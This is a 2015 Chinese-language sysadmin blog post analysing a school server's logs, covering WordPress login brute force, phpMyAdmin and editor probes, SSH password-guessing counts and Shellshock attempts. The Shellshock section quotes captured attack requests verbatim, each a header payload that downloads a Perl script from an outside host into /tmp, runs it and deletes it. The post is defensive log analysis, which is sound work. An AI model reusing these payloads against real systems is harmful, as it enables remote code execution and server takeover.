---
layout: post
title: 網管的田野調查之誰在踹我的Server
date: 2015-02-20 11:33
comments: true
categories: 
---
身為一個網管，平常的好（ㄜˋ）習（ㄑㄩˋ）慣（ㄨㄟˋ）之一就是看Log
定期看看你的 server 最近又被誰踹了、有哪些攻擊的痕跡、有誰跟你 Say Hello (?

# HTTP Access Log

## User-Agent

```
$ log-cat.py "{8}" school-access.log | sort | uniq -c | sort -nr | head -n 16
  56428 -
   2716 Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
   2569 Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
   2206 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
   2175 Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:37.0) Gecko/20100101 Firefox/37.0
   1444 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7
   1031 Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.5 (internal dummy connection)
    895 Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
    698 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0
    590 Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
    584 Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
    508 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
    491 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0
    451 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
    431 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
    407 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
```
<!--more-->

## 其中最大宗的是來 try `wp-login` 的...

```
$ cat school-access.log | grep -e 'POST \/\+wp-login' | wc -l
54473
$ log-cat.py "{0}" school-access.log | sort | uniq -c | sort -nr | head -n 16
  48381 80.237.75.2
   3280 77.72.147.39
   2716 74.7.97.202
   1684 1.162.50.120
   1557 39.8.188.89
   1266 124.12.208.13
   1067 ::1
    854 60.250.33.110
    732 180.177.122.206
```

## phpMyAdmin setup.php、fckeditor、ewebeditor、找後台

大概分為以下四種

- `phpMyAdmin` 的 `setup.php` 有一大堆洞不解釋...
- `fckeditor` 的檔案上傳
- `ewebeditor` 是一個來自左岸的 WYSIWYG Editor，也有很多洞
- 單純自動掃 `/admin`

在此提醒， `phpMyAdmin` 裝好之後記得要刪掉 `setup.php` ，另外也記得不要用太常見的路徑，如：

- phpmyadmin
- phpMyAdmin
- myadmin

之類的名稱

```
$ cat school-access.log | grep -i -e 'admin' | grep -v -e "\/wp-\|$HIDE_SIG" | log-cat.py "{4}" | sort | uniq -c | sort -nr | head -n 40
    108 GET /phpMyAdmin/scripts/setup.php HTTP/1.1
     39 GET /myadmin/scripts/setup.php HTTP/1.1
     15 GET //phpMyAdmin/scripts/setup.php HTTP/1.1
     14 GET //phpmyadmin/scripts/setup.php HTTP/1.1
     14 GET //myadmin/scripts/setup.php HTTP/1.1
     14 GET //MyAdmin/scripts/setup.php HTTP/1.1
      7 GET /phpmyadmin/scripts/setup.php HTTP/1.1
      7 GET /MyAdmin/scripts/setup.php HTTP/1.1
      6 HEAD /webadmin/fckeditor/editor/ HTTP/1.1
      3 HEAD /phpMyAdmin/ HTTP/1.1
      3 HEAD /admin/editor/editor/ HTTP/1.1
      3 HEAD /admin/editor/ HTTP/1.1
      3 HEAD /admin HTTP/1.1
      3 GET /phpmyadmin/scripts/setup.php HTTP/1.0
      2 HEAD /admin_article HTTP/1.1
      2 HEAD /admin/system/editor/FCKeditor/editor/ HTTP/1.1
      2 HEAD /admin/ewebeditor/ HTTP/1.1
      2 GET /phpMyAdmin/scripts/setup.php HTTP/1.0
      1 HEAD /wenadmin HTTP/1.1
      1 HEAD /webadmin HTTP/1.1
      1 HEAD /web_admin HTTP/1.1
      1 HEAD /sysadmin/fckeditor/editor/ HTTP/1.1
      1 HEAD /sysadmin HTTP/1.1
      1 HEAD /lists/admin/FCKeditor/editor/ HTTP/1.1
      1 HEAD /admin_article/fckeditor/editor/ HTTP/1.1
      1 HEAD /admin/webeditor/ HTTP/1.1
      1 HEAD /admin/webedit/ HTTP/1.1
      1 HEAD /admin/web_editor/ HTTP/1.1
      1 HEAD /admin/htmledit/ HTTP/1.1
      1 HEAD /admin/fckeditor/editor/ HTTP/1.1
      1 HEAD /admin/fckeditor/editor HTTP/1.1
      1 HEAD /admin/fckedit/editor/ HTTP/1.1
      1 HEAD /admin/eWebEditor/ HTTP/1.1
      1 HEAD /_admin/fckeditor/editor/ HTTP/1.1
      1 HEAD /Infoadmin/ewebeditor/ HTTP/1.1
      1 HEAD /INFOADMIN/eWebeditor/ HTTP/1.1
      1 HEAD /Administrator_School/EwebEditor/ HTTP/1.1
      1 GET /phpmyadmin2/main.php HTTP/1.0
      1 GET /phpmyadmin/main.php HTTP/1.0
      1 GET /phpmyadmin//setup/config.php?type=post HTTP/1.1
```

## Shell Shock

[shellshock on Wikipedia](http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)

```
$ cat school-access.log | grep -e 'curl\|wget\|perl\|python' | grep -v -e 'curl\/'
87.106.95.7 - - [19/Feb/2015:05:05:58 +0800] "GET HTTP/1.1 HTTP/1.1" 400 392 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://202.202.121.27/core -O /tmp/core;wget http://202.202.121.27/core -O /dev/shm/core; curl -O /dev/shm http://202.202.121.27/core;curl -O /tmp/core http://202.202.121.27/core;perl /tmp/core;perl /dev/shm/core;rm -rf /tmp/core*;rm -rf /dev/shm/core*\");'"
108.61.212.127 - - [08/Feb/2015:23:58:26 +0800] "GET HTTP/1.1 HTTP/1.1" 400 485 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://play.marketplay.eu/apache23 -O /tmp/apache23;curl -O /tmp/apache23 http://play.marketplay.eu/apache23;chmod 777 /tmp/apache23;cd /tmp/;./apache23 &\");'"
69.162.105.66 - - [14/Feb/2015:04:22:32 +0800] "GET HTTP/1.1 HTTP/1.1" 400 392 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://217.113.112.248/ou -O /tmp/b.pl;curl -O /tmp/b.pl http://217.113.112.248/ou;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
209.92.176.24 - - [14/Feb/2015:20:06:38 +0800] "GET HTTP/1.1 HTTP/1.1" 400 392 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"rm -rf /tmp/l.pl*;wget http://87.106.189.34/ou.pl -O /tmp/l.pl;curl -O /tmp/l.pl http://87.106.189.34/ou.pl;perl /tmp/l.pl;rm -rf l.pl**\");'"
54.175.72.187 - - [04/Feb/2015:06:59:11 +0800] "GET HTTP/1.1 HTTP/1.1" 400 485 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://allproutah.com/t3.log -O /tmp/t3.log;curl -O /tmp/t3.log http://allproutah.com/t3.log;perl /tmp/t3.log;rm -rf /tmp/t3.log*\");'"
91.142.209.68 - - [30/Jan/2015:08:12:19 +0800] "GET HTTP/1.1 HTTP/1.1" 400 485 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://87.106.130.7/bou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://87.106.130.7/bou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
89.152.241.67 - - [13/Dec/2014:02:15:23 +0800] "GET HTTP/1.1 HTTP/1.1" 400 485 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget www.freistilreisen.de/jack.jpg -O /tmp/jack.jpg;curl -O /tmp/jack.jpg www.freistilreisen.de/jack.jpg;perl /tmp/jack.jpg;rm -rf /tmp/jack.jpg*\");'"
61.182.202.57 - - [13/Dec/2014:12:02:23 +0800] "GET HTTP/1.1 HTTP/1.1" 400 485 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://210.230.186.9/icons/guide/jp.pl -O /tmp/jp.pl;curl -O /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;fetch /tmp/jp.pl http://210.230.186.9/icons/guide/jp.pl;perl /tmp/jp.pl;rm -rf /tmp/jp.pl*\");'"
```

### "the beast"

看起來應該是某些 server 預載了 `test-cgi` 來告訴你 cgi-bin 能動了，應該是在打 shellshock 之前做測試

```
210.107.37.210 - - [20/Feb/2015:02:34:26 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 415 "-" "the beast"
140.115.17.214 - - [05/Feb/2015:07:10:15 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
140.115.17.214 - - [26/Jan/2015:22:07:30 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
218.25.54.25 - - [27/Jan/2015:03:14:32 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
140.115.17.214 - - [30/Jan/2015:00:28:33 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
198.211.30.100 - - [19/Jan/2015:09:55:07 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
198.211.30.100 - - [23/Jan/2015:12:35:22 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
198.211.30.100 - - [23/Jan/2015:17:46:57 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
62.80.182.229 - - [18/Jan/2015:00:27:05 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
198.211.30.100 - - [13/Dec/2014:19:19:59 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
198.211.30.100 - - [06/Dec/2014:21:48:10 +0800] "GET /cgi-bin/test-cgi HTTP/1.1" 404 508 "-" "the beast"
```

# auth.log

## sshd

ssh 被 try 的數量也蠻多的，記得裝 fail2ban

```
# 這些是存在的 User
$ cat-sys-log.sh /var/log auth.log | grep -e '^.\{15\} Parents sshd' | grep -e '\]: Failed password' | grep -v -e '\]: Failed password for invalid user' | awk '{ print $9 }' | sort | uniq -c | sort -nr
  16370 root
     60 www-data
     15 nobody
      7 lp
      7 backup
      6 games
      4 sshd
      3 bin
# 這些是不存在的 User
$ cat-sys-log.sh /var/log auth.log | grep -e '^.\{15\} Parents sshd' | grep -e '\]: Failed password for invalid user' | awk '{ print $11 }' | sort | uniq -c | sort -nr
    305 test
    199 nagios
    192 guest
    138 zabbix
    100 admin
     60 zxin10
     52 apache
     36 zhaowei
     33 PlcmSpIp
     32 web
     29 ubuntu
     28 cacti
     27 weblogic
     27 tomcat
     23 ftp
     21 squid
     18 webadmin
     18 Test
     16 r00t
     16 jboss
     16 java
     16 apache2
     15 oracle
     13 ubnt
     12 sysadmin
     12 httpd
     10 xbian
     10 pi
     10 info
      9 wangyi
      9 ts3
      9 nginx
      9 dff
      9 alex
      8 zhangyan
      8 jack
      7 support
      6 xiuzuan
      6 vyatta
      6 send
      6 log
      6 default
      5 xbmc
      5 ts
      5 teamspeak
      5 postgres
      5 git
      5 debug
      5 david
      5 christian
      5 boot
      5 aaron
      5 123456
      5 123
      4 webmail
      4 user
      4 smtp
      4 resin
      4 javaprg
      4 guestx
      4 guestuser
      4 guestadmin
      4 dreamer
      4 cisco
      4 cactiuser
      4 bob
      4 bash
      4 apache1
      3 ts3srv
      3 system
      3 staff
      3 sebastian
      3 sales
      3 nologin
      3 nagiosuser
      3 nagiosadmin
      3 karaf
      3 httpdocs
      3 httpd2
      3 hscroot
      3 ftpd
      3 ftp1
      2 john
      2 cusadmin
      2 administrator
      2 a
      1 xxxxxx
      1 unknown
      1 tech
      1 somesecguy
      1 shit
      1 root1
      1 kur
      1 iclock
      1 Fake
      1 chishin
      1 blank
      1 b
      1 arbab
      1 aditza
      1 00089
      1 0
```

### 以 IP 來看統計

```
# 因為 list 太長，所以只列出大於 10 次的 IP
$ cat-sys-log.sh /var/log auth.log | grep -e '^.\{15\} Parents sshd' | grep -e '\]: Failed password for' | awk '{ if($10 == "from") { print $11 } else if($10 == "user") {print $13} }' | sort | uniq -c | sort -nr
   7099 14.63.73.40
   2252 218.61.196.203
   1794 154.120.226.38
    998 182.92.183.24
    921 115.231.222.176
    499 158.85.244.228
    355 59.160.98.144
    323 222.186.130.222
    321 222.186.56.44
    321 222.186.56.42
    321 222.186.134.7
    321 115.239.248.48
    321 111.74.238.15
    319 222.186.58.81
    319 222.186.56.33
    167 115.231.218.130
    165 115.231.218.131
    122 183.136.216.4
     90 115.239.228.34
     55 193.111.238.147
     46 162.213.25.67
     40 115.239.228.6
     33 94.136.45.178
     31 87.106.132.188
     31 115.239.228.7
     31 115.230.126.151
     30 222.161.4.147
     26 115.239.228.9
     26 115.239.228.13
     25 115.239.228.15
     25 115.231.222.45
     23 115.239.228.4
     22 183.136.216.3
     20 115.239.228.16
     19 222.161.4.149
     19 103.41.124.111
     18 115.239.228.35
     17 115.239.228.11
     16 115.239.228.14
     14 183.136.216.6
     13 58.218.213.238
     13 115.239.228.12
     12 106.39.255.243
     11 222.161.209.92
```

# Attachments

- [log-cat.py](https://gist.github.com/Inndy/1d30d6d528babde6df47)
- [cat-sys-log.sh](https://github.com/Inndy/cli-tools/blob/master/cat-sys-log.sh)